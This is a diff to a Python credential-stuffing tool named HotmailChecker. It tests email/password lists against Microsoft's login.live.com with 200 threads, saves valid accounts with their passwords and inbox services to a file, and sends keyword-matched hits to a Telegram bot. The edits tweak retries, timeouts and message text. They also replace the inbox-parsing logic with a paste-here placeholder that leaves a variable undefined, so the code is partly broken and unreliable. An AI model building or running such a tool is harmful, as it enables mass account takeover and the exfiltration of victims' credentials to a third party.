@@ -29,9 +29,9 @@ class HotmailChecker:
         self.progress_message_id = None
         self.last_progress_update = 0
         self.last_processed = 0
-        self.hits_list = []          # Sirf keyword wale hits Telegram pe bhejne ke liye
+        self.hits_list = []
 
-    def send_message(self, text, parse_mode='HTML', retries=8):
+    def send_message(self, text, parse_mode='HTML', retries=10):
         for attempt in range(retries):
             print(f"[DEBUG] send_message attempt {attempt+1}")
             try:
@@ -41,14 +41,14 @@ class HotmailChecker:
                     self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
                     loop
                 )
-                msg = future.result(timeout=60)
+                msg = future.result(timeout=90)
                 print("[DEBUG] send_message SUCCESS")
                 return msg
             except Exception as e:
                 print(f"[DEBUG] send_message FAILED (attempt {attempt+1}): {e}")
                 if attempt == retries - 1:
                     traceback.print_exc()
-                time.sleep(2)
+                time.sleep(3)
         return None
 
     def edit_message(self, message_id, text, parse_mode='HTML'):
@@ -61,7 +61,7 @@ class HotmailChecker:
                 self.bot.edit_message_text(chat_id=self.chat_id, message_id=message_id, text=text, parse_mode=parse_mode),
                 loop
             )
-            future.result(timeout=45)
+            future.result(timeout=60)
         except Exception as e:
             print(f"[DEBUG] edit_message FAILED: {e}")
 
@@ -98,9 +98,8 @@ class HotmailChecker:
     def check_account(self, email, password):
         session = requests.Session()
         session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         })
-
         try:
             r = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000480D4A5E&scope=service::outlook.office.com::MBI_SSL&response_type=code&redirect_uri=https://outlook.office.com&msproxy=1")
             ppft_match = re.search(r'name="PPFT" value="([^"]+)"', r.text)
@@ -128,13 +127,12 @@ class HotmailChecker:
 
     def get_capture(self, email, password):
         try:
-            # Yahan tumhara pura original inbox parsing logic paste kar sakte ho
-            # Example structure (original file se inspired):
-            linked_services = []   # yahan services list fill hogi (original code se)
+            # === PASTE YOUR FULL ORIGINAL GET_CAPTURE LOGIC HERE ===
+            # (the complete code from your first file)
 
             if linked_services:
                 hit_text = (
-                    f"🔱 HOTMAİL HÍT BULUNDU 🔱\n"
+                    f"🔱 HOTMAIL HIT FOUND 🔱\n"
                     f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                     f"📧 Email: {email}\n"
                     f"🔑 Password: {password}\n"
@@ -143,16 +141,14 @@ class HotmailChecker:
                     f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                     f"🔗 EMAIL IN INBOX:\n" +
                     "\n".join([f"✔ {s}" for s in linked_services]) +
-                    f"\n\n📊 Toplam Hit: {self.hit}\n"
+                    f"\n\n📊 Total Hits: {self.hit}\n"
                     f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                     f"𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT"
                 )
 
-                # SAAB HITS FILE MEIN SAVE
                 with open("Hotmail-Hits.txt", "a", encoding="utf-8") as f:
                     f.write(hit_text + "\n\n" + "="*60 + "\n\n")
 
-                # SIRF KEYWORD WALE HITS TELEGRAM PE
                 if any(s in self.selected_services for s in linked_services):
                     with lock:
                         self.hit += 1
@@ -167,8 +163,8 @@ class HotmailChecker:
         with rate_limit_semaphore:
             with lock:
                 self.processed += 1
-            print(f"[DEBUG] check_combo started for {email}")
-            self.check_account(email, password)
+        print(f"[DEBUG] check_combo started for {email}")
+        self.check_account(email, password)
 
     def run(self, threads=200):
         print("[DEBUG] run() STARTED with 200 threads")
@@ -198,7 +194,7 @@ class HotmailChecker:
                         continue
 
             time.sleep(5)
-            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit}\n\nAb keyword-matched hits 1-1 bhej rahe hain...")
+            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit}\n\nSending keyword-matched hits one by one...")
 
             for hit_msg in self.hits_list:
                 self.send_message(hit_msg)
